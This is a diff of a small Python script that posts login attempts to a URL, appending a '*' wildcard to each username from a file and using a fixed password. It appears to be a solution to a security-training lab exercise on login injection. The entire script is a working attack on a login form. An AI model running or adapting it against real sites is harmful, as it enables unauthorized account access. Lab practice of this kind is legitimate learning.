@@ -1,40 +1,52 @@
+# first trying brute_all_charcters.property
+
+
 import requests
 import sys
 
-# Check if the correct arguments are provided
-if len(sys.argv) != 3:
-    print("Usage: python script.py <url> <username_file>")
-    sys.exit(1)
 
-url = sys.argv[1]  # URL from command-line arguments
-username_file = sys.argv[2]  # Username file from command-line arguments
-password = "known_password"  # Replace with the valid password
+url= sys.argv[1] # url 
+username_file= sys.argv[2] # usernamefile
+print("USage: python python_file.py <URL>")
 
-# Read usernames from the file
+
+password="Academy_student!"
+
 try:
     with open(username_file, "r") as file:
-        usernames = [line.strip() + "*" for line in file if line.strip()]  # Add wildcard to each username
-except FileNotFoundError:
-    print(f"Error: Username file '{username_file}' not found.")
-    sys.exit(1)
+    #   username= []
+    #    for line in file:
+    #         stripped_lines=line.strip()
 
-# Try each username with the wildcard
+    #         if stripped_lines:
+    #             modified_lines = stripped_lines + "*"
+                
+    #             username.append(modified_lines)
+        usernames = [line.strip()+"*" for line in file if line.strip()]
+except FileNotFoundError:
+    print(f"File {username_file} not found, pls ensure it is valid filename")
+     
 for username in usernames:
-    data = {
-        "username": username,
-        "password": password
+    data={
+        "username":username,
+        "password":password
     }
     try:
-        # Send the POST request
-        response = requests.post(url, data=data)
-
-        # Check the response for success or failure
+        response= requests.post(url, data=data)
         if 'Login successful but the site is temporarily down for security reasons' in response.text:
-            print(f"Attempt with username '{username}' was successful!")
-            break
-        elif 'Login failed' in response.text:
-            print(f"Attempt with username '{username}' failed.")
+            print(f"attempt with username':{username} was successful")
+
+        elif'Login failed' in response.text:
+            print(f"attempt with username:{username}, failed!")
         else:
-            print(f"Attempt with username '{username}' received an unexpected response.")
+            print(f"attempt with username:{username}, recieved unexpected response")
+    
     except requests.exceptions.RequestException as e:
-        print(f"An error occurred while trying username '{username}':", e)
+        print("An error occured:", e)
+
+
+
+
+                 
+
+
